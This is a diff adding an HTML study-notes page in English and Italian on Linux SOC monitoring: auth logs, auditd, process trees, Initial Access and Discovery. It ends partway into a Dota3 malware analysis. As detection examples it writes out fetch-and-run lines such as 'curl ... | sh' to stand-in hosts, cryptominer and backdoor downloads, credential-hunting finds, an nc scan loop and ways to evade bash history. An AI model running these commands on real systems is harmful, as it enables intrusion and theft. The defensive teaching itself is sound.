@@ -1,0 +1,732 @@
+<!DOCTYPE HTML>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<title>Sysmon</title>
+<meta name="description" content="Linux Security Monitoring">
+    <meta name="author" content="Massimo">
+    <link rel="stylesheet" href="Styles/Styles.css">
+</head>
+<body>
+    <!-- Dashboard iframe -->
+<div class="dashboard">
+    <iframe src="dashboardSOC.html" title="dashboardSOC"></iframe>
+</div>
+<!-- Header titolo -->
+<header>
+    <div class="line"></div>
+    <h3>Linux Security Monitoring</h3>
+</header>
+
+<div class="flex-container">
+    
+        <div id="inizio" class="tools-container">
+        <a href="#discLog"  class="button-link">Discovering Logs</a>
+        <a href="#authlog"  class="button-link">Authentication Logs</a>
+        <a href="#genericLogs"  class="button-link">Generic System Logs</a>  
+        <a href="#Syscall"  class="button-link">System Calls</a>  
+        <a href="#Auditd"  class="button-link">Auditd</a>
+        <a href="#InitAccess"  class="button-link">Initial Access</a>           
+        <a href="#Discovery"  class="button-link">Discovery</a>  
+        <a href="#Dota3"  class="button-link">DOTA3 Analysis</a> 
+        <a href="#revshell"  class="button-link">Reverse Shells</a> 
+        <a href="#privesca"  class="button-link">Privilege Escalation</a> 
+        <a href="#startup"  class="button-link">Startup Persistence</a> 
+        <a href="#account"  class="button-link">Account Persistence</a> 
+        <a href="#target"  class="button-link">Targeted Attacks</a> 
+
+        </div>
+<div class="sub-container">
+<p is="disclog"><b>Discovering Logs: </b>
+Lastly, let's say you hunt for all user logins, but don't know where to look for them. Linux system logs are stored in the <code>/var/log/</code> folder in plain text, so you can simply grep for related keywords like "login", "auth", or "session" in all log files there and narrow down your next searches:<br>
+<code>
+    <b># List what's logged by your system (/var/log folder)</b> <br>
+root@thm-vm:~$ ls -l /var/log<br>
+drwxr-xr-x  2 root      root               4096 Aug 12 16:41 apt<br>
+drwxr-x---  2 root      adm                4096 Aug 12 12:40 audit<br>
+-rw-r-----  1 syslog    adm               45399 Aug 13 15:05 auth.log<br>
+-rw-r--r--  1 root      root            1361277 Aug 12 16:41 dpkg.log<br>
+drwxr-sr-x+ 3 root      systemd-journal    4096 Oct 22  2024 journal<br>
+-rw-r-----  1 syslog    adm              214772 Aug 13 13:57 kern.log<br>
+-rw-r-----  1 syslog    adm              315798 Aug 13 15:05 syslog<br>
+[...]<br><br>
+
+<b># Search for potential logins across all logs (/var/log)</b><br>
+root@thm-vm:~$ grep -R -E "auth|login|session" /var/log <br>
+......<br>
+</code></p>
+<h2>Authentication Logs</h2>
+<p id="authlog"><b>Authentication Logs </b> -> <code>/var/log/auth.log</code> (or /var/log/secure on RHEL-based systems)<br>
+<i>Event time + Host name + process ID + Message from the process: </i><br>
+<code>2025-08....     thm-vm           sshd[1690]         accepted pubblic key ......</code>
+</p>
+<h3>Login and Logout Events</h3>
+<p>There are many ways users authenticate into a Linux machine: locally, via SSH, using "sudo" or "su" commands, or automatically to run a cron job. Each successful logon and logoff is logged, and you can see them by filtering the events containing the "session opened" or "session closed" keywords:</p><br>
+
+<b>"Local and Remote Logins"</b><code><br>
+cat /var/log/auth.log | grep -E 'session opened|session closed'<br>
+# Local, on-keyboard login and logout of Bob (login:session)<br>
+2025-08-02T16:04:43 thm-vm login[1138]: pam_unix(login:session): session opened for user bob(uid=1001) by bob(uid=0)<br>
+2025-08-02T19:23:08 thm-vm login[1138]: pam_unix(login:session): session closed for user bob<br></code>
+<code># Remote login examples of Alice (via SSH and then SMB)<br>
+2025-08-04T09:09:06 thm-vm sshd[839]: pam_unix(sshd:session): session opened for user alice(uid=1002) by alice(uid=0)<br>
+2025-08-04T12:46:13 thm-vm smbd[1795]: pam_unix(samba:session): session opened for user alice(uid=1002) by alice(uid=0)<br>
+</code>
+<b>"Cron and Sudo Logins"</b><code><br>
+root@thm-vm:~$ cat /var/log/auth.log | grep -E 'session opened|session closed'<br>
+# Traces of some cron job launch running as root (cron:session)<br>
+2025-08-06T19:35:01 thm-vm CRON[41925]: pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)<br>
+2025-08-06T19:35:01 thm-vm CRON[3108]: pam_unix(cron:session): session closed for user root<br>
+# Carol running "sudo su" to access root (sudo:session)<br>
+2025-08-07T09:12:32 thm-vm sudo: pam_unix(sudo:session): session opened for user root(uid=0) by carol(uid=1003)<br>
+</code><br>
+<p>In addition to the system logs, the SSH daemon stores its own log of successful and failed SSH logins. These logs are sent to the same auth.log file, but have a slightly different format. Let's see the example of two failed and one successful SSH logins:</p><br>
+
+<b>SSH-Specific Events</b><br><code>
+root@thm-vm:~$ cat /var/log/auth.log | grep "sshd" | grep -E 'Accepted|Failed'<br>
+# Common SSH log format: < is-successful > < auth-method > for < user > from < ip ><br>
+2025-08-07T11:21:25 thm-vm sshd[3139]: Failed password for root from 222.124.17.227 port 50293 ssh2<br>
+2025-08-07T14:17:40 thm-vm sshd[3139]: Failed password for admin from 138.204.127.54 port 52670 ssh2<br>
+2025-08-09T20:30:51 thm-vm sshd[1690]: Accepted publickey for bob from 10.19.92.18 port 55050 ssh2: < key ><br>
+</code>
+<h3>Miscellaneous Events</h3>
+<p>You can also use the same log file to detect user management events. This is easy if you know basic Linux commands: If useradd is a command to add new users <br></p>
+<code>
+root@thm-vm:~$ cat /var/log/auth.log | grep -E '(passwd|useradd|usermod|userdel)\['<br>
+2023-02-01T11:09:55 thm-vm passwd[644]: password for 'ubuntu' changed by 'root'<br>
+2025-08-07T22:11:11 thm-vm userdel[1887]: delete user 'oldbackdoor'<br>
+2025-08-07T22:11:29 thm-vm useradd[1878]: new user: name=backdoor, UID=1002, GID=1002, shell=/bin/sh<br>
+2025-08-07T22:11:54 thm-vm usermod[1906]: add 'backdoor' to group 'sudo'<br>
+2025-08-07T22:11:54 thm-vm usermod[1906]: add 'backdoor' to shadow group 'sudo'<br>
+</code>
+<p>Lastly, depending on system configuration and installed packages, you may encounter interesting or unexpected events. For example, you may find commands launched with sudo, which can help track malicious actions.<br></p>
+<code><b>Commands Run With Sudo:</b><br>
+root@thm-vm:~$ cat /var/log/auth.log | grep -E 'COMMAND='<br>
+2025-08-07T11:21:49 thm-vm sudo: ubuntu : TTY=pts/0 ; [...] COMMAND=/usr/bin/systemctl stop edr<br>
+2025-08-07T11:23:18 thm-vm sudo: ubuntu : TTY=pts/0 ; [...] COMMAND=/usr/bin/ufw status numbered<br>
+2025-08-07T11:23:33 thm-vm sudo: ubuntu : TTY=pts/0 ; [...] COMMAND=/usr/bin/su<br></code>
+<a href="#inizio"  class="button-link">Torna all'indice!</a>
+<hr>
+<h3 id="genericLogs">Generic System Logs</h3>
+<code>/var/log/kern.log:</code> Kernel messages and errors, useful for more advanced investigations<br>
+<code>/var/log/syslog (or /var/log/messages):</code> A consolidated stream of various Linux events<br>
+<code>/var/log/dpkg.log (or /var/log/apt):</code> Package manager logs on Debian-based systems<br>
+<code>/var/log/dnf.log (or /var/log/yum.log):</code> Package manager logs on RHEL-based systems<br>
+<h3>App-Specific Logs</h3>
+<p>Analyze database logs to see which queries were run, mail logs to investigate phishing, container logs to catch anomalies, and web server logs to know which pages were opened, when, and by whom.</p>
+<h3 id="bash">Bash History</h3>
+<p>By default, commands are first stored in memory during your session, and then written to the per-user<code> ~/.bash_history</code> file when you log out. You can open the ~/.bash_history file to review commands from previous sessions or use the history command to view commands from both your current and past sessions<br></p>
+<p><b>Bash History Limitations:</b><br>
+# Attackers can simply add a leading space to the command to avoid being logged<br>
+<code>ubuntu@thm-vm:~$  echo "You will never see me in logs!"</code><br>
+# Attackers can paste their commands in a script to hide them from Bash history<br>
+<code>ubuntu@thm-vm:~$ nano legit.sh && ./legit.sh</code><br>
+# Attackers can use other shells like /bin/sh that don't save the history like Bash<br>
+<code>ubuntu@thm-vm:~$ sh</code><br>
+<code>$ echo "I am no longer tracked by Bash!"</code><br>
+<b>Comando importante:</b><code> sudo -i </code> -> da utente normale a root <br>
+<b>Comando inverso:</b><code> exit, logout, su < nomeutente > </code><br>
+</p>
+<h3>Runtime Monitoring</h3>
+<p>By default, Linux doesn't log process creation, file changes, or network-related events, collectively known as runtime events</p>
+<h3 id="Syscall">System Calls</h3>
+<p> In short, whenever you need to open a file, create a process, access the camera, or request any other OS service, you make a specific system call. There are over 300 system calls in Linux, like execve to execute a program. 
+Example:<br>
+1) you start  program by typing "whoami" + Enter  -> 2) Your shell start "/usr/bin/whoami" by sending "execve" system call<br>
+2) -> 3) Linux Kernel processes the details and starts the "execve" system call  -> 4) Linux Kernel accesses hardware: CPU, Mem., and disk<br>
+4) -> 3) -> 5)Linux kernel returns the results, and you see "whoami" output<br>
+
+<b>Why do you need to know about system calls? </b>
+All modern EDRs and logging tools rely on them - they monitor the main system calls and log the details in a human-readable format. Since there is nearly no way for attackers to bypass system calls, all you have to do is choose the system calls you'd like to log and monitor.<br>
+<i>(Poiché quasi non esiste modo per gli aggressori di bypassare le chiamate di sistema, tutto ciò che devi fare è scegliere le chiamate di sistema che desideri registrare e monitorare. )</i>
+</p>
+<h3 id="Auditd">Auditd Daemon</h3>
+<p>Auditd (Audit Daemon) is a built-in auditing solution often used by the SOC team for runtime monitoring.</p>
+<p>Instructions located in <code>/etc/audit/rules.d/</code> that define which system calls to monitor and which filters to apply</p>
+<a href="https://github.com/Neo23x0/auditd/blob/master/audit.rules " target="_blank"  title="audit">Focus on the highest-risk events and build balanced rulesets</a><br><br>
+<p>Always log 	+ 	monitor this syscall + Apply monitoring filers     + apply these tags for easier search + comment</p><br>
+<code>
+-a always,exit		 -S execve -F exe=/usr/bin/wget 				-F key=proc_wget #Log execution of "wget" cmd (execve syscall)<br>
+-a always,exit 	-S openat -F path=/secret.thm 				-F key=file_thmsecret #Log access to the " secret file" (openat syscall)<br>
+-a always,exit 	-S openat -F dir=/etc/ssh -F perm=w 			-F key=file_sshconf #Log file changes in the "etc ssh dir." (perm=write)<br>
+-a always,exit 	-S connect -F exe=/usr/bin/python3.12 		-F key=net_python #Log network connection made by the process process<br>
+</code><br>
+<h3>Using Auditd</h3>
+<code>/var/log/audit/audit.log</code><br>
+<p>it is easier to use the ausearch command: <code>ausearch -i -k proc_wget </code> <- <b>i</b>  rende più leggibile output,<b> k </b>indica una chiave specifica (proc_wget)</p><br>
+<p>the PROCTITLE shows the process command line, CWD reports the current working directory, and the remaining two lines show the system call details, like:<br>
+<code>pid=3888, ppid=3752:</code> Process ID and Parent Process ID. Helpful in linking events and building a process tree<br>
+<code>auid=ubuntu: Audit user.</code> The account originally used to log in, whether locally (keyboard) or remotely (SSH)<br>
+<code>uid=root:</code> The user who ran the command. The field can differ from auid if you switched users with sudo or su<br>
+<code>tty=pts1: Session identifier.</code> Helps distinguish events when multiple people work on the same Linux server<br>
+<code>exe=/usr/bin/wget:</code> Absolute path to the executed binary, often used to build SOC detection rules<br>
+<code>key=proc_wget:</code> Optional tag specified by engineers in auditd rules that is useful to filter the events<br>
+</p>
+
+<h3>Auditd Alternatives</h3>
+<a href="https://github.com/microsoft/SysmonForLinux" target="_blank"  title="audit"><b>Sysmon for Linux:</b> A perfect choice if you already work with Sysmon and love XML</a><br>
+<a href="#inizio"  class="button-link">Torna all'indice!</a>
+<hr>
+<h2 id="InitAccess">Initial Access via SSH</h2>
+<p><i> External Remote Services MITRE technique (T1133) </i></p>
+<ol>
+    <li>Common risks when using key-based authentication:<ul>
+        <li>Threat actors access a service or source code where private SSH keys have been stored (Like a GitHub repository or Ansible automation server containing SSH credentials)</li>
+        <li>Threat actors steal SSH keys to a server by infecting an admin's laptop with a data stealer</li>
+    </ul></li>
+    <li>Additional risks when using password-based authentication:<ul>
+        <li>An IT admin sets a weak SSH password for a quick test and forgets to revert the changes</li>
+        <li>An IT support enables SSH for a contractor who sets the password to "12345678"</li>
+        <li>A network engineer accidentally exposes an old, insecure SSH server to the Internet</li>
+    </ul></li>
+</ol><br>
+<code>cat /var/log/auth.log | grep "sshd"</code>
+
+<h3>Detecting SSH Attacks</h3>
+<p><b>SSH Breach Example: </b>Now, imagine a common real-world scenario: An IT administrator enables public SSH access to the server, allows password-based authentication, and sets a weak password for one of the support users. Combined, these three actions inevitably lead to an SSH breach, as it's a matter of time before threat actors guess the password. The log sample below shows such a compromise: A brute force followed by a password breach.<br>
+<i>1) Multiple failed logins followed by a success  -> 2) Logins from an external untrusted IP address  -> 3) Logins by password, an insecure auth method  -> 4) 3 indicators confirming "thmsupport" breach</i>
+</p>
+<p><b>Detecting SSH Attacks</b>: <br><code>cat /var/log/auth.log | grep -E 'Accepted'</code> <i> <- you queried the logs and found three successful SSH logins, each of which could indicate an attack. How would you distinguish bad from good?</i><br>Esempio:<br>
+<code>
+ubuntu@thm-vm:~$ cat /var/log/auth.log | grep -E 'Accepted'<br>
+2025-08-19T14:00:02 thm-vm sshd[1013]: Accepted publickey for ansible from 10.14.105.255 port 18442 ssh2: [...]<br>
+2025-08-20T12:56:49 thm-vm sshd[2830]: Accepted password for jsmith from 54.155.224.201 port 51058 ssh2<br>
+2025-08-22T03:14:06 thm-vm sshd[2830]: Accepted password for jsmith from 196.251.118.184 port 51058 ssh2<br>
+</code><br>
+Spiegazione:<br>
+<b>Login of Ansible:</b> The first login appears legitimate: It used public-key authentication from an internal IP, likely an Ansible automation account. Moreover, the login at exactly 14:00 matches periodic task behavior. But to be sure, you'd still need to verify that 10.14.105.255 is an Ansible server and review the following user's activity for signs of a breach.<br>
+<b>Logins of Jsmith:</b> The two logins of jsmith are more interesting, as there are three red flags: <i>Password-based authentication</i>, logins <i>from external IPs</i>, and <i>time difference between the logins</i> (one of the logins must be at night for the user, right?). Still, to make a final verdict, you might need to investigate more details:<br>
+<b>Username:</b> Who owns the user? Is it expected for them to log in at this time and from this IP?<br>
+<b>Source IP:</b> What do TI tools and asset lookups say about the IP? Is it trusted or malicious?<br>
+<b>Login history:</b> Was the login preceded by brute force or other suspicious system events?<br>
+<b>Next steps:</b> Is the login suspicious? Should I analyze user actions following the login?<br>
+</p>
+<p>In base un esercizio che ho fatto, ho analizzato per prima cosa:<br>
+<code>cat /var/log/auth.log | grep -E "Accepted"</code>   <-  cerco i Password-based auth ( quando non si legge RSA SHA256)<br>
+<code>cat /var/log/auth.log | grep -E "Failed"</code> <- Da qui si può notare quando inizia e finisce il Brute-Force attack<br>
+<code>cat /var/log/auth.log | grep -E "2025-08-21" | grep "91.224.92"</code> <- un esempio, prendendo l'ultima data e l'ip sospetto </p>
+
+<h2>Initial Access via Services</h2>
+<h3>Linux and Public Services</h3>
+<p>Linux systems often host public-facing services or applications such as web servers, email servers, databases, and various development or IT management tools. They also comprise the core of most firewall or VPN software. However, whenever one of these applications is compromised, the entire Linux host is at risk. This risk is covered with the T1190 MITRE technique. Let's see a few real-world examples:</p>
+<ul>
+    <li><b>CVE in Zimbra Collaboration:</b> Allowed the attackers to execute arbitrary OS commands</li>
+    <li><b>Exposed Docker API port:</b> Acted as an entry point in a series of cloud infrastructure breaches</li>
+    <li><b>CVE in Palo Alto firewalls:</b> Granted attackers full control over the Linux-based firewall's OS</li>
+    <li><b>WordPress "plugins" feature:</b> Often abused to upload malware like web shells to the system</li>
+</ul>
+<h3>Using Application Logs</h3>
+<ul>
+    <li>Use web logs to detect a variety of web attacks</li>
+    <li>Use database logs to detect suspicious SQL queries</li>
+    <li>Use VPN logs to detect abnormal VPN login events</li>
+    <li>Refer to other logs for specific events like bank transactions</li>
+</ul>
+<h3>Web as Initial Access</h3>
+<p>Any publicly exposed application can lead to a Linux breach, especially vulnerable web servers.<br>
+<i>Example:</i> The IT team creates a simple web application called TryPingMe, where you can ping the specified IP online. Internally, the app runs a system command ping -c 2 [YOUR-INPUT] to test the connection, without any input filtering. The attackers would easily spot a command injection there. <br>
+</p>
+<code>cat /var/log/nginx/access.log<br>
+10.2.33.10 - - [19/Aug/2025:12:26:07] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 [...]<br>
+10.12.88.67 - - [23/Aug/2025:09:32:22] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 [...]<br>
+10.14.105.255 - - [26/Aug/2025:20:09:43] "GET /ping?host=hello HTTP/1.1" 500 [...]<br>
+10.14.105.255 - - [26/Aug/2025:20:09:46] "GET /ping?host=whoami HTTP/1.1" 500 [...]<br>
+</code>
+<p><i>Web Logs Analysis:</i> Instead of IPs, the client puts Linux commands inside the query parameters - a clear sign of command injection!<br>
+-10.14.105.255 is likely the attacker's IP<br>
+-The /ping page is vulnerable and allows code execution<br>
+-The attacker executed OS commands like whoami and ls<br>
+-The entire system is now at risk because of the TryPingMe vulnerability<br>
+</p>>
+<code> /var/log/nginx/access.log</code>
+<h2>Detecting Service Breach</h2>
+<p>One way to detect a service breach is to use application logs, But remember, application logs are not always available or helpful. Instead, most SOC teams rely on <b>process tree analysis</b> - a universal approach to unwrapping the Initial Access.</p>
+<p><i>Example(A): </i>A common SOC scenario is when you receive an alert about a suspicious command, let's say whoami. Why was it executed - due to IT activity, or maybe a service breach? To answer this, all you need is to build a process tree and trace the command back to its parent process.
+<br> Process Tree Usage To Uncover Initial Acces: </p>
+<ol>
+    <li>you start here, from a mysterious "whoami". You see that its parent process has a PID of "3905" (for example)</li>
+    <li>you search for a process with PID "3905". the results didn't help, moving on to No.3 ) (vedi suo ppid)</li>
+    <li>You search for a process with PID of "3898". Looks like all started from a Python web app.</li>
+</ol>
+<h2>Auditd and Process Tree</h2>
+<p>Continuing the <i>Example(A)</i>, -> you begin by locating the suspicious command in the logs with <code>ausearch -i -x whoami</code>. Next, you walk up the process tree using the <code>--pid</code> option until you reach PID 1, the OS process. The tree eventually shows that whoami was launched by a Python web application (/opt/mywebapp/app.py). This immediately raises the question: <i>Was the application breached and used as an entry point?</i><br></p>
+<code><b>--->Tracing Whoami Origin</b><br>
+ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami<br>
+type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec<br>
+<br>
+ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami<br>
+type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec<br>
+<br>
+ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py<br>
+type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec<br>
+</code><br>
+<code><b>----> Listing All Child Processes</b><br>
+ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler output<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh<br>
+[...]<br>
+</code><br>
+<h2>Advanced Initial Access</h2>
+<p><b>Huma-Led Attacks: </b> Since Linux primarily is a server OS operated by technical people, it is harder to trick system owners into running phishing malware or inserting a malicious USB. Still, the risk remains, for example: <br>
+<b>Scenario Example	 + Consequences</b><br>
+<i>An IT member looks for a solution to a server issue and desperately tries this script found in a forum:</i> <code>curl https://shadyforum.thm/fix.sh | bash	</code> ->  
+			The IT member didn't check the script content, and it appeared to be malware, silently infecting the server <br>
+<i>A developer wants to install a Python "fastapi" package on the server, but mistypes a single letter:</i> <code> pip3 install fastpi</code> ->			
+			The mistyped package was malware, deliberately prepared and published by threat actors  (Real-world case)<br>
+</p>
+<h2>Supply Chain Compromise: MITRE-T1195 </h2>
+<p>While not unique to Linux, you should also be aware of Supply Chain Compromise. These attacks breach a software first, and then infect all its users with the malicious update. Since a typical Linux server uses hundreds of software dependencies maintained by different developers, the attack can come from anywhere, anytime. Let's see some examples:<br>
+A backdoor in the XZ Utils library that is a part of SSH nearly led to a breach of millions of Linux servers<br>
+A breach of the tj-actions resulted in a leak of thousands of secrets, like SSH keys and access tokens<br>
+</p>
+
+<h2>Detecting the Attacks</h2>
+<p>All Initial Access techniques in this notes can be uncovered through a process tree analysis. You start with a trigger, such as a SIEM alert on a suspicious command or a connection to a known malicious IP. From there, you build a process tree to trace which application or user initiated the events - a web server, an internal application, or an IT administrator’s SSH session. Finally, you determine whether the activity is legitimate or an indicator of malicious behavior:</p><br>
+<ul>
+    <li>Why would the web app run "whoami"? Can it be a web application?</li>
+    <li>Why would the Tryhackme app run these commands? Can it be a supply  chain compromise?</li>
+    <li>Why would Tom login via SSH and download a cryptominer? Can it be SSH breach?</li>
+</ul>
+<p><i>Note:</i>Si parte dal processo sospetto sino a risalire al processo systemd (OS process(PID=1)<br>Nome del detection method per initial access techniques :  <b>process tree analysis</b>
+ </p>
+<a href="#inizio"  class="button-link">Torna all'indice!</a>
+<hr>
+<h2 id="Discovery">Discovery Overview</h2>
+<p>Imagine suddenly appearing in a Linux system, and all you see is a command-line interface. Your first question would be about where you are and how you appeared there, right? Interestingly, this is how most Linux breaches start for attackers. This is because botnets usually automate the Initial Access, and human attackers join only when an entry point is ready.
+</p>
+
+<h3>First Actions</h3>
+<p>The first discovery commands threat actors run on the Linux systems are usually the same. The only exception when Discovery is skipped is when the attackers already know their target or simply want to install a cryptominer and exit, no matter who the victim is. Let's see some basic Discovery examples:<br>
+<b>Discovery Goal  + Typical Commands</b><br>
+</p>
+<ul>
+    <li>OS and Filesystem Discovery
+		<code>pwd, ls /, env, uname -a, lsb_release -a, hostname</code>
+</li>
+    <li>User and Groups Discovery	
+		<code>id, whoami, w, last, cat /etc/sudoers, cat /etc/passwd</code>
+</li>
+    <li>Process and Network Discovery	
+		<code>ps aux, top, ip a, ip r, arp -a, ss -tnlp, netstat -tnlp</code>
+</li>
+    <li>Cloud or Sandbox Discovery
+		<code>systemd-detect-virt, lsmod, uptime, pgrep "< edr-or-sandbox >"</code>
+</li>
+</ul>
+<p>(<b>Note</b>but one specific command should have your attention - <b>whoami</b>. While legitimate applications rarely need this command, adversaries almost always run it first after breaching a service. In fact, your SOC team can even consider creating a detection rule for any whoami execution - there is a high chance you'll catch the attackers! )</p>
+<h2>Specialized Discovery</h2>
+<p>After the initial Discovery, threat actors might also utilize more focused commands to achieve their goals: Data stealers look for passwords and secrets to collect, cryptocurrency miners query CPU and GPU information to optimize the mining, and botnet scripts scan the network for new victims. Some malware can also combine all three objectives. For example:<br><b>Attack Objectives	+ Typical Commands</b></p>
+<ul>
+    <li>Find and steal credentials and other sensitive data	
+			<code>history | grep pass, find / -name .env, find /home -name id_rsa</code></li>
+    <li>Identify how suitable the system is for crypto mining	
+			<code>cat /proc/cpuinfo, lscpu | grep Model, free -m, top, htop</code></li>
+    <li>Scan the internal network for other future victims	
+			<code>ping < ip >, for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done</code></li>
+</ul>
+<h3>Detecting Discovery</h3>
+<p>Detecting Discovery commands is straightforward with auditd or other runtime monitoring tools. First, configure auditd to log the right commands;
+Then, hunt for Discovery using a SIEM or ausearch. But the real challenge is deciding if the commands came from an attacker, a legitimate service, or an IT administrator.</p>
+<ol>
+    <li>Log common Discovery commands (e.g with Auditd)</li>
+    <li>Hunt for Discovery in Siem or manually with ausearch</li>
+    <li>Use process tree to identify what caused the Discovery</li>
+</ol>
+<p>It is very important to get the context of the Discovery commands. For example, it's a red flag when a web server suddenly spawns whoami or when your IT member starts looking for secrets with find and grep. On the other hand, a network monitoring tool is often expected to periodically ping the local network. You can get that context by building a process tree, for example:<br></p>
+<code><b>----> Tracing Whoami Origin</b><br>
+ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami<br>
+type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami<br>
+ubuntu@thm-vm:~$ ausearch -i --pid 3898 # Identify its parent process, a lp.sh script<br>
+type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/bash /tmp/lp.sh<br>
+type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash<br>
+<br>
+ubuntu@thm-vm:~$ ausearch -i --ppid 3898 # Look for other processes created by the lp.sh<br>
+[Five more commands like "find /home -name *secret*" confirming the script is malicious ]<br>
+</code>
+<h2>Motivation for Attacks</h2>
+<p>After the Discovery stage, threat actors usually reveal their motivation by installing specialized malware or taking actions unique to some class of attack. Before jumping into the technical review, let's consider the common goals of attackers when breaching Linux. They can be organized into two informal categories: <b>"Hack and Forget" and targeted attacks</b>. </p>
+<h3>"Hack and Forget" Attacks</h3>
+<p>These attacks run at scale and focus on quick gains. For example, a threat group may continuously scan the Internet for an exposed SSH with a "tryguessme" password and get a few victims every month. Then, after a quick discovery, the attack usually ends up in one of three scenarios below (or three scenarios at once):<br>
+-Install Cryptominer: Earn money by using the victim's CPU/GPU to mine cryptocurrency<br>
+-Enroll to Botnet: Add the victim to a botnet (e.g. Mirai) and use it for tasks like DDoS<br>
+-Use as Proxy: Use the victim to send phishing, host malware, or route the attacker's traffic</p>
+<h2>Ingress Tool Transfer</h2>
+<p>So, how do the threat actors continue the attack and download malware like cryptominer to their Linux victim? In MITRE terms, how do they perform Ingress Tool Transfer? There are many ways, but in the vast majority of cases, they utilize one of these three preinstalled commands:<br>
+<b>Command+ Usage Example</b><br></p>
+<ul>
+    <li><b>Wget:</b> Download a file from the website	- <code>wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz</code>	</li>
+    <li><b>Curl:</b> Make a request to the webpage		- <code>curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"</code>	</li>
+    <li><b>SSH:</b> Transfer a file via SCP or SFTP		- <code>scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh</code>	</li>
+</ul>
+<p><i>(the commands above can be logged with auditd and sometimes appear in Bash history. )</i></p>
+<p>If the victim is <i>reachable over SSH, an attacker can run scp or sftp from their own system</i>. In this case, you won't see the command on the victim's auditd logs, but you will see a new SSH login! The same principle applies to other file transfer services such as FTP or SMB. Let's see an example:<br></p>
+<code>
+<b>Option 1: Attacker Connects to Victim</b><br>
+attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp<br>
+[OK] Connecting to thm-vm machine via SSH...<br>
+[OK] Logged in on thm-vm via SSH as "ubuntu"<br>
+[OK] File transferred from attack-vm to thm-vm<br>
+[OK] Job is done, logging out from thm-vm<br>
+<br>
+<b># To detect on victim, look for SSH logins in /var/log/auth.log</b><br>
+Option 2: Victim Connects to Attacker<br>
+ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp<br>
+[OK] Connecting to attack-vm machine via SSH...<br>
+[OK] Logged in on attack-vm via SSH as "attacker"<br>
+[OK] File transferred from attack-vm to thm-vm<br>
+[OK] Job is done, logging out from attack-vm<br>
+<br>
+<b># To detect on victim, look for "scp" command in Auditd logs</b><br>
+</code>
+<h3>Additional Detection</h3>
+<p>You mostly relied on auditd process creation events to detect the malicious commands and on authentication logs to detect suspicious SSH logins. They are both excellent sources for uncovering the most common attacks. However, for Ingress Tool Transfer, your SOC can also rely on:<br></p>
+<ul>
+    <li>Network Traffic:<ul>
+        <li>A download from an IP previously seen in cyber attacks (Virustotal example)</li>
+        <li>A download from a suspicious or known malicious domain, such as qfpkvwgq.thm</li>
+        <li>A download from a public service known to host attack tools, such as GitHub</li>
+    </ul></li>
+    <li>File Events:<ul>
+        <li>A newly-created file in the temporary folders, like /tmp or /var/tmp</li>
+        <li>A newly-created file named like exploit, shell.php, or kF1pBsY5</li>
+    </ul></li>
+    <li>Antivirus alerts:
+        <ul><li>EDR or antivirus alert triggering on a new malicious file or process</li></ul>
+    </li>
+</ul>
+<code>ausearch -i -x < command > </code>
+<br><a href="#inizio"  class="button-link">Torna all'indice!</a><br>
+<h2 id="Dota3">DOTA 3 MALWARE ANALYSIS</h2>
+<p>Dota3, a simple but well-known malware that infected (and still infects!) many systems worldwide. Please note that some malware actions in this task were simplified to improve readability. Now, let's see how the infection starts!</p>
+<h4>Initial Access:</h4>
+<ul>
+    <li>The botnet of more than 2000 distinct IPs across 94 countries scans the Internet for systems with open SSH</li>
+    <li>The botnet brute-forces the systems, mainly targeting the root user and trying the top 1000 weak passwords</li>
+    <li>If the password was guessed, one of the botnet hosts accesses the victim via SSH and continues the attack</li>
+</ul>
+<h4>Discovery:</h4>
+<p>Next, from within the SSH session, the threat actor automates the Discovery by running multiple commands in quick succession. Even from the first three lines below, you may conclude it is a cryptominer infection, as there is a low chance that other malware will ever need to know the victim's CPU and RAM information.</p>
+<code># Checks CPU and RAM information<br>
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'<br>
